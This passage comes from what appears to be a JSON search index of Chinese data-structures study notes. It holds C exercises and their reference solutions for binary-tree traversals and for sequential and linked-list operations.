u7f16\u5199\u4e8c\u53c9\u6811\u7684\u53cc\u5e8f\u904d\u5386\u7b97\u6cd5","text":"<p>\u8bf7\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u4e8c\u53c9\u6811\u7684\u53cc\u5e8f\u904d\u5386\u529f\u80fd\u3002\u6bcf\u68f5\u4e8c\u53c9\u6811\u91c7\u7528\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u5165\uff0c\u5176\u4e2d\u7528\u2019#'\u8868\u793a\u7a7a\u7ed3\u70b9\u3002\u53cc\u5e8f\u904d\u5386\u662f\u6307\u5bf9\u4e8e\u4e8c\u53c9\u6811\u7684\u6bcf\u4e00\u4e2a\u7ed3\u70b9\u6765\u8bf4\uff0c\u5148\u8bbf\u95ee\u8fd9\u4e2a\u7ed3\u70b9\uff0c\u518d\u6309\u53cc\u5e8f\u904d\u5386\u5b83\u7684\u5de6\u5b50\u6811\uff0c\u7136\u540e\u518d\u4e00\u6b21\u8bbf\u95ee\u8fd9\u4e2a\u7ed3\u70b9\uff0c\u63a5\u4e0b\u6765\u6309\u53cc\u5e8f\u904d\u5386\u5b83\u7684\u53f3\u5b50\u6811\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_33","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u7684\u65b9\u5f0f\u8f93\u5165\u4e00\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1aab##c##\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u53cc\u5e8f\u904d\u5386\u4e8c\u53c9\u6811\u7684\u7ed3\u679c\u4e3a\uff1aabac\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_34","title":"\u9898\u76ee","text":"C<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\ntypedef struct BiTNode {\n    //\u5b9a\u4e49\u7ed3\u6784\u4f53\n    char data;\n    struct BiTNode *lchild, *rchild;\n} BiTNode, *Bitree;\n\nvoid Creat_Bitree(Bitree *T) {\n    //\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u521b\u5efa\u4e8c\u53c9\u6811\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nvoid DoubleTraverse_Tree(Bitree T) {\n    //\u53cc\u5e8f\u904d\u5386\u4e8c\u53c9\u6811\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint main() {\n    Bitree T = NULL;\n    printf(\"\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u5165\u4e00\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1a\");\n    Creat_Bitree(&amp;T);\n    printf(\"\u53cc\u5e8f\u904d\u5386\u4e8c\u53c9\u6811\u7684\u7ed3\u679c\u4e3a\uff1a\");\n    DoubleTraverse_Tree(T);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_35","title":"\u7b54\u6848","text":"<p>\u597d\u96be\u554a\u2026\u2026</p> C<pre><code>// \u521b\u5efa\u4e8c\u53c9\u6811\nvoid Creat_Bitree(Bitree* T) {\n    char ch;\n    scanf(\"%c\", &amp;ch);\n    if (ch == '#') {\n        *T = NULL;\n    }\n    else {\n        *T = (BiTNode*)malloc(sizeof(BiTNode));\n        (*T)-&gt;data = ch;\n        Creat_Bitree(&amp;((*T)-&gt;lchild));\n        Creat_Bitree(&amp;((*T)-&gt;rchild));\n    }\n}\n\n// \u53cc\u5e8f\u904d\u5386\u4e8c\u53c9\u6811\nvoid DoubleTraverse_Tree(Bitree T) {\n    if (T) {\n        printf(\"%c\", T-&gt;data); // \u5148\u8bbf\u95ee\u6839\u8282\u70b9\n        DoubleTraverse_Tree(T-&gt;lchild); // \u9012\u5f52\u53cc\u5e8f\u904d\u5386\u5de6\u5b50\u6811\n\n        if (T-&gt;lchild) {\n            printf(\"%c\", T-&gt;data); // \u518d\u6b21\u8bbf\u95ee\u6839\u8282\u70b9\n        }\n        // \u5176\u5b9e\u5173\u952e\u5c31\u662f\u8fd9\u4e2aif\uff0c\u60f3\u60f3\u6ca1\u6709\u8fd9\u4e2aif\u4f1a\u600e\u6837\n\n        DoubleTraverse_Tree(T-&gt;rchild); // \u9012\u5f52\u53cc\u5e8f\u904d\u5386\u53f3\u5b50\u6811\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_36","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>void Creat_Bitree(Bitree* T) {\n    //\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u521b\u5efa\u4e8c\u53c9\u6811\n    char ch;\n    ch = getchar();\n    if (ch == '#')\n        *T = NULL; //\u7a7a\u6811\n    else {\n        *T = (Bitree)malloc(sizeof(BiTNode)); //\u521b\u5efa\u7ed3\u70b9\n        (*T)-&gt;data = ch;\n        Creat_Bitree(&amp;(*T)-&gt;lchild); // \u5de6\u5b50\u6811\n        Creat_Bitree(&amp;(*T)-&gt;rchild); // \u53f3\u5b50\u6811\n    }\n}\n\nvoid DoubleTraverse_Tree(Bitree T) {\n    //\u53cc\u5e8f\u904d\u5386\u4e8c\u53c9\u6811\n    if (T == NULL)\n        return;\n    else if (T-&gt;lchild == NULL &amp;&amp; T-&gt;rchild == NULL)\n        printf(\"%c\", T-&gt;data); //\u53f6\u5b50\u7ed3\u70b9\n    else {\n        printf(\"%c\", T-&gt;data);\n        DoubleTraverse_Tree(T-&gt;lchild); //\u9012\u5f52\u5de6\u5b50\u6811\n        printf(\"%c\", T-&gt;data);\n        DoubleTraverse_Tree(T-&gt;rchild); //\u904d\u5386\u53f3\u5b50\u6811\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_37","title":"\u8f93\u51fa\u4e8c\u53c9\u6811\u4e2d\u4ece\u6bcf\u4e2a\u53f6\u5b50\u7ed3\u70b9\u5230\u6839\u7ed3\u70b9\u7684\u8def\u5f84","text":"<p>\u8bf7\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u8f93\u51fa\u4e00\u68f5\u4e8c\u53c9\u6811\u4e2d\u6bcf\u4e2a\u53f6\u5b50\u7ed3\u70b9\u5230\u6839\u7ed3\u70b9\u7684\u8def\u5f84\u3002\u6bcf\u68f5\u4e8c\u53c9\u6811\u91c7\u7528\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u5165\uff0c\u5176\u4e2d\u7528\u2019#'\u8868\u793a\u7a7a\u7ed3\u70b9\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_38","title":"\u793a\u4f8b","text":"<p>\u8981\u6c42</p> Text Only<pre><code>1\u3001\u8f93\u51fa\u7684\u6bcf\u6761\u8def\u5f84\u6362\u884c\u8f93\u51fa\n2\u3001\u6bcf\u6761\u8def\u5f84\u4e2d\u7684\u7ed3\u70b9\u7528\u4e00\u4e2a\u7a7a\u683c\u7b26\u5206\u5f00\n</code></pre> <p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u7684\u65b9\u5f0f\u8f93\u5165\u4e00\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1aab##c##\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u8be5\u4e8c\u53c9\u6811\u4e2d\u4ece\u6bcf\u4e2a\u53f6\u5b50\u7ed3\u70b9\u5230\u6839\u7ed3\u70b9\u7684\u8def\u5f84\u4e3a\uff1a\nb a\nc a\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_39","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define MAX 100\n\ntypedef struct BiTNode {\n    //\u5b9a\u4e49\u7ed3\u6784\u4f53\n    char data;\n    struct BiTNode *lchild, *rchild;\n} BiTNode, *Bitree;\n\nvoid Creat_Bitree(Bitree *T) {\n    //\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u521b\u5efa\u4e8c\u53c9\u6811\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nvoid Node_Route(Bitree T, char *path, int path_length) {\n    //\u4e8c\u53c9\u6811\u4e2d\u4ece\u6bcf\u4e2a\u53f6\u5b50\u7ed3\u70b9\u5230\u6839\u7ed3\u70b9\u7684\u8def\u5f84\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint main() {\n    Bitree T = NULL;\n    char path[MAX];\n    printf(\"\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u5165\u4e00\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1a\");\n    Creat_Bitree(&amp;T);\n    printf(\"\u8be5\u4e8c\u53c9\u6811\u4e2d\u4ece\u6bcf\u4e2a\u53f6\u5b50\u7ed3\u70b9\u5230\u6839\u7ed3\u70b9\u7684\u8def\u5f84\u4e3a\uff1a\\n\");\n    Node_Route(T, path, 0);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_40","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>void Creat_Bitree(Bitree* T) {\n    //\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u521b\u5efa\u4e8c\u53c9\u6811\n    char ch;\n    ch = getchar();\n    if (ch == '#')\n        *T = NULL; //\u7a7a\u6811\n    else {\n        *T = (Bitree)malloc(sizeof(BiTNode)); //\u521b\u5efa\u7ed3\u70b9\n        (*T)-&gt;data = ch;\n        Creat_Bitree(&amp;(*T)-&gt;lchild); // \u5de6\u5b50\u6811\n        Creat_Bitree(&amp;(*T)-&gt;rchild); // \u53f3\u5b50\u6811\n    }\n}\n\nvoid Node_Route(Bitree T, char* path, int path_length) {\n    //\u4e8c\u53c9\u6811\u4e2d\u4ece\u6bcf\u4e2a\u53f6\u5b50\u7ed3\u70b9\u5230\u6839\u7ed3\u70b9\u7684\u8def\u5f84\n    if (T == NULL) {\n        return;\n    }\n    if (T-&gt;lchild == NULL &amp;&amp; T-&gt;rchild == NULL) {\n        printf(\"%c \", T-&gt;data);\n        for (int i = path_length - 1; i &gt;= 0; i--) {\n            printf(\"%c \", path[i]);\n        }\n        printf(\"\\n\");\n    }\n    else {\n        path[path_length++] = T-&gt;data;\n        Node_Route(T-&gt;lchild, path, path_length);\n        Node_Route(T-&gt;rchild, path, path_length);\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_41","title":"\u5224\u522b\u4e8c\u53c9\u6811\u662f\u4e0d\u662f\u5b8c\u5168\u4e8c\u53c9\u6811","text":"<p>\u8bf7\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u5224\u65ad\u4e00\u68f5\u4e8c\u53c9\u6811\u662f\u5426\u662f\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u529f\u80fd\u3002\u6bcf\u68f5\u4e8c\u53c9\u6811\u91c7\u7528\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u5165\uff0c\u5176\u4e2d\u7528\u2019#'\u8868\u793a\u7a7a\u7ed3\u70b9\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_42","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u7684\u65b9\u5f0f\u8f93\u5165\u4e00\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1aab##c##\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>YES\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_43","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct BiTNode {\n    //\u5b9a\u4e49\u7ed3\u6784\u4f53\n    char data;\n    struct BiTNode *lchild, *rchild;\n} BiTNode, *Bitree;\n\nvoid Creat_Bitree(Bitree *T) {\n    //\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u521b\u5efa\u4e8c\u53c9\u6811\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint Count_Nodes(Bitree T) {\n    //\u8ba1\u7b97\u4e8c\u53c9\u6811\u7684\u8282\u70b9\u4e2a\u6570\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint Count_LeafNodes(Bitree T) {\n    //\u8ba1\u7b97\u4e8c\u53c9\u6811\u7684\u53f6\u5b50\u8282\u70b9\u4e2a\u6570\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint Judge_FullBiTree(Bitree T) {\n    //\u5224\u65ad\u4e8c\u53c9\u6811\u662f\u5426\u4e3a\u5b8c\u5168\u4e8c\u53c9\u6811\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint main() {\n    Bitree T = NULL;\n    printf(\"\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u5165\u4e00\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1a\");\n    Creat_Bitree(&amp;T);\n    if (Judge_FullBiTree(T))\n        printf(\"YES\");\n    else\n        printf(\"NO\");\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_44","title":"\u7b54\u6848","text":"<p>\u53c2\u8003\u6587\u7ae0\uff08\u8d85\u94fe\u63a5\uff09\uff1a\u5224\u65ad\u662f\u5426\u4e3a\u5b8c\u5168\u4e8c\u53c9\u6811(\u4e24\u79cd\u65b9\u6cd5)</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/#_45","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>void Creat_Bitree(Bitree* T) {\n    //\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u521b\u5efa\u4e8c\u53c9\u6811\n    char ch;\n    ch = getchar();\n    if (ch == '#')\n        *T = NULL; //\u7a7a\u6811\n    else {\n        *T = (Bitree)malloc(sizeof(BiTNode)); //\u521b\u5efa\u7ed3\u70b9\n        (*T)-&gt;data = ch;\n        Creat_Bitree(&amp;(*T)-&gt;lchild); // \u5de6\u5b50\u6811\n        Creat_Bitree(&amp;(*T)-&gt;rchild); // \u53f3\u5b50\u6811\n    }\n}\n\nint Count_Nodes(Bitree T) {\n    //\u8ba1\u7b97\u4e8c\u53c9\u6811\u7684\u8282\u70b9\u4e2a\u6570\n    if (T == NULL)\n        return 0;\n    return 1 + Count_Nodes(T-&gt;lchild) + Count_Nodes(T-&gt;rchild);\n}\n\nint Count_LeafNodes(Bitree T) {\n    //\u8ba1\u7b97\u4e8c\u53c9\u6811\u7684\u53f6\u5b50\u8282\u70b9\u4e2a\u6570\n    if (T == NULL)\n        return 0;\n    if (T-&gt;lchild == NULL &amp;&amp; T-&gt;rchild == NULL)\n        return 1;\n    return Count_LeafNodes(T-&gt;lchild) + Count_LeafNodes(T-&gt;rchild);\n}\n\nint Judge_FullBiTree(Bitree T) {\n    //\u5224\u65ad\u4e8c\u53c9\u6811\u662f\u5426\u4e3a\u5b8c\u5168\u4e8c\u53c9\u6811\n    int nodes = Count_Nodes(T);\n    int leafNodes = Count_LeafNodes(T);\n    return (nodes == leafNodes * 2 - 1);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/","title":"Alpha \u5355\u94fe\u8868","text":""},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_1","title":"\u6253\u5370\u987a\u5e8f\u8868","text":"<p>\u8bf7\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b8c\u5584\u51fd\u6570<code>PrintList</code>\uff0c\u5b9e\u73b0\u521b\u5efa\u4e00\u4e2a\u987a\u5e8f\u8868\uff0c\u5e76\u5b9e\u73b0\u6253\u5370\u987a\u5e8f\u8868\u7684\u529f\u80fd\u3002</p> <p>\u793a\u4f8b\u8f93\u51fa</p> Text Only<pre><code>1\n2\n3\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_2","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define MAXSIZE 100\ntypedef int ElemType;\n\ntypedef struct{\n    ElemType data[MAXSIZE];\n    int length;\n}SqList;\n\nvoid PrintList(SqList L){\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nint main(){\n    SqList L;\n    L.data[0] = 1;\n    L.data[1] = 2;\n    L.data[2] = 3;\n    L.length = 3;\n    PrintList(L);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_3","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>void PrintList(SqList L){\n    for(int i = 0; i &lt; L.length; i++){\n        printf(\"%d\\n\",L.data[i]);\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_4","title":"\u987a\u5e8f\u8868\u7684\u63d2\u5165","text":"<p>\u8bf7\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b8c\u5584\u51fd\u6570<code>ListInsert</code>\u548c<code>PrintList</code>\uff0c\u5b9e\u73b0\u5728\u987a\u5e8f\u8868\u4e2d\u7684\u6307\u5b9a\u4f4d\u7f6e\u63d2\u5165\u5143\u7d20\u7684\u529f\u80fd\uff0c\u5e76\u6253\u5370\u8f93\u51fa\u987a\u5e8f\u8868\u3002</p> <p>\u793a\u4f8b\u8f93\u51fa</p> Text Only<pre><code>Insert success\n1\n4\n2\n3\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_5","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n\n#define MAXSIZE 100\ntypedef int ElemType;\n\ntypedef struct {\n    ElemType data[MAXSIZE];\n    int length;\n} SqList;\n\nbool ListInsert(SqList *L, int i, ElemType e) {\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nvoid PrintList(SqList L) {\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint main() {\n    SqList L;\n    L.data[0] = 1;\n    L.data[1] = 2;\n    L.data[2] = 3;\n    L.length = 3;\n    bool ret = ListInsert(&amp;L, 2, 4);\n    if (ret) {\n        printf(\"Insert success\\n\");\n        PrintList(L);\n    } else {\n        printf(\"Insert is false\\n\");\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_6","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>bool ListInsert(SqList* L, int i, ElemType e) {\n    if (i &gt; L-&gt;length + 1 || i &lt; 1) {\n        return false;\n    }\n    if (L-&gt;length &gt;= MAXSIZE) {\n        return false;\n    }\n    for (int j = L-&gt;length; j &gt;= i; j--) {\n        L-&gt;data[j] = L-&gt;data[j - 1];\n    }\n    L-&gt;data[i - 1] = e;\n    L-&gt;length++;\n    return true;\n}\n\nvoid PrintList(SqList L) {\n    for (int i = 0; i &lt; L.length; i++) {\n        printf(\"%d\\n\", L.data[i]);\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_7","title":"\u5220\u9664\u987a\u5e8f\u8868\u5143\u7d20","text":"<p>\u8bf7\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b8c\u5584\u51fd\u6570<code>ListDelete</code>\u548c<code>PrintList</code>\uff0c\u5b9e\u73b0\u5728\u987a\u5e8f\u8868\u7684\u6307\u5b9a\u4f4d\u7f6e\u5220\u9664\u5143\u7d20\u7684\u529f\u80fd\uff0c\u5e76\u6253\u5370\u8f93\u51fa\u987a\u5e8f\u8868\u3002</p> <p>\u793a\u4f8b\u8f93\u51fa</p> Text Only<pre><code>Delete success\n1\n3\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_8","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n\n#define MAXSIZE 100\ntypedef int ElemType;\n\ntypedef struct {\n    ElemType data[MAXSIZE];\n    int length;\n} SqList;\n\nbool ListDelete(SqList *L, int i, ElemType *e) {\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nvoid PrintList(SqList L) {\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint main() {\n    SqList L;\n    L.data[0] = 1;\n    L.data[1] = 2;\n    L.data[2] = 3;\n    L.length = 3;\n    ElemType e;\n    bool ret = ListDelete(&amp;L, 2, &amp;e);\n    if (ret) {\n        printf(\"Delete success\\n\");\n        PrintList(L);\n    } else {\n        printf(\"Delete is false\\n\");\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_9","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>bool ListDelete(SqList* L, int i, ElemType* e) {\n    if (i &lt; 1 || i &gt; L-&gt;length) {\n        return false;\n    }\n    if (L-&gt;length == 0) {\n        return false;\n    }\n\n    *e = L-&gt;data[i - 1];\n    for (int j = i; j &lt; L-&gt;length; j++) {\n        L-&gt;data[j - 1] = L-&gt;data[j];\n    }\n\n    L-&gt;length--;\n\n    return true;\n}\n\nvoid PrintList(SqList L) {\n    for (int i = 0; i &lt; L.length; i++) {\n        printf(\"%d\\n\", L.data[i]);\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_10","title":"\u6309\u503c\u67e5\u627e\u987a\u5e8f\u8868\u5143\u7d20","text":"<p>\u8bf7\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b8c\u5584\u51fd\u6570<code>LocateElem</code>\uff0c\u5b9e\u73b0\u5728\u987a\u5e8f\u8868\u4e2d\u67e5\u627e\u6307\u5b9a\u5143\u7d20\u4f4d\u7f6e\u7684\u529f\u80fd\uff0c\u5e76\u6253\u5370\u8f93\u51fa\u987a\u5e8f\u8868\u3002</p> <p>\u793a\u4f8b\u8f93\u51fa</p> Text Only<pre><code>Locate success\nPosition: 2\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_11","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n\n#define MAXSIZE 100\ntypedef int ElemType;\n\ntypedef struct{\n    ElemType data[MAXSIZE];\n    int length;\n}SqList;\n\nint LocateElem(SqList L, ElemType e){\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nint main(){\n    SqList L;\n    L.data[0] = 1;\n    L.data[1] = 2;\n    L.data[2] = 3;\n    L.length = 3;\n    int ret = LocateElem(L, 2);\n    if(ret != -1){\n        printf(\"Locate success\\n\");\n        printf(\"Position: %d\", ret);\n    } else{\n        printf(\"Locate is false\\n\");\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_12","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>int LocateElem(SqList L, ElemType e) {\n    for (int i = 0; i &lt; L.length; i++) {\n        if (L.data[i] == e) {\n            return i + 1;\n        }\n    }\n    return -1;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_13","title":"\u5355\u94fe\u8868\u7684\u5408\u5e76","text":"<p>\u6d89\u53ca\uff1a\u5355\u94fe\u8868\u7684\u5408\u5e76  \u5220\u9664\u91cd\u590d\u6570\u636e  \u8f6c\u7f6e\u94fe\u8868</p> <p>\u8fd9\u4e2a\u9898\u76ee\u7b80\u5355\u70b9\u505a\u5c31\u662f\u5934\u63d2\u3002\u590d\u6742\u70b9\u505a\u5c31\u5148\u4ece\u5c0f\u5230\u5927\u5408\u5e76\uff0c\u7136\u540e\u5220\u9664\u91cd\u590d\u6570\u636e\uff0c\u7136\u540e\u9006\u8f6c\u5143\u7d20\u4e86\uff08\u53bb\u91cd\u4e5f\u53ef\u4ee5\u5305\u542b\u5728\u5408\u5e76\u4e2d\uff09\u3002</p> <p>\u53e6\u5916\u8bf4\u660e\u4e00\u4e0b\uff0c\u975e\u6ce8\u91ca\u7684\u4ee3\u7801\u5c06\u5408\u5e76\u548c\u5220\u9664\u64cd\u4f5c\u5408\u4e8c\u4e3a\u4e00\u4e86\uff0c\u4f46\u662f\u4e5f\u4e00\u5b9a\u8981\u770b\u770b\u5220\u9664\u64cd\u4f5c\uff0c\u540e\u9762\u7684\u9898\u76ee\u201c\u5408\u5e76\u9012\u589e\u6709\u5e8f\u94fe\u8868\u201d\u4e5f\u662f\u540c\u6837\u7684\u64cd\u4f5c</p> <p>\u8981\u6c42\uff1a\u4e24\u4e2a\u5355\u94fe\u8868\u2019A\u2019\u548c\u2019B\u2019\uff0c\u5747\u662f\u6309\u5143\u7d20\u503c\"\u9012\u589e\u6709\u5e8f\"\u6392\u5217\uff0c\u8bf7\u7f16\u5199\u7b97\u6cd5\u5c06\u2019A\u2019\u8868\u548c\u2019B\u2019\u8868\u6309\u5143\u7d20\u503c\"\u9012\u51cf\u6709\u5e8f\"\uff0c\u5f52\u5e76\u5230\u2019C\u2019\u8868\u3002'C\u2019\u8868\u4e2d\u9488\u5bf9\u2019A\u2019\u8868\u548c\u2019B\u2019\u8868\u91cd\u590d\u7684\u5143\u7d20\uff0c\u53ea\u4fdd\u7559\u4e00\u4e2a\u3002\u6253\u5370\u8f93\u51fa\u2019C\u2019\u8868\u4e2d\u7684\u5143\u7d20\u3002\uff08\u8865\u5168<code>merge()</code>\uff09</p> <p>\u793a\u4f8b</p> Text Only<pre><code>A\u8868\uff1a{1,3,5,6,8,9}\nB\u8868\uff1a{2,3,4,5,6,7}\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>9 8 7 6 5 4 3 2 1\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E9%93%BE%E8%A1%A8/#_14","title":"\u9898\u76ee\uff1a","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef int ElemType;\n//\u5355\u94fe\u8868\ntypedef struct LNode{\n    ElemType data;\n    struct LNode *next;\n}LNode, *LinkList;\n\n//\u8bf7\u5b8c\u6210\u8be5\u51fd\u6570\uff0c\u5b9e\u73b0A\u548cB\uff0c\u6309\u9012\u51cf\u5408\u5e76\u4e3aC\uff0c\u5e76\u4e14A\u548cB\u4e2d\u76f8\u540c\u7684\u5143\u7d20\uff0c\u53ea\u51fa\u73b0\u4e00\u6b21 \nint merge(LinkList A, LinkList B, LinkList C)\n{  \n\n    return 1;\n}\n\n\nint main()\n{\n\n    ElemType ad[6] = {1,3,5,6,8,9};\n    ElemType bd[6] = {2,3,4,5,6,7};\n    LinkList A,pA,B,pB,C,pC,l;\n    int i; \n\n    //\u521b\u5efa\u5355\u94fe\u8868A\u5e76\u8d4b\u503c \n    A = (LinkList)malloc(sizeof(LNode));//\u5934\u7ed3\u70b9 \n    A-&gt;next = NULL;\n    pA = A;\n    for(i = 0; i &lt; 6; i++){\n        l = (LinkList)malloc(sizeof(LNode));\n        l-&gt;data = ad[i];\n        l-&gt;next = NULL;\n        pA-&gt;next = l;\n        pA = pA-&gt;next;\n    }    \n\n    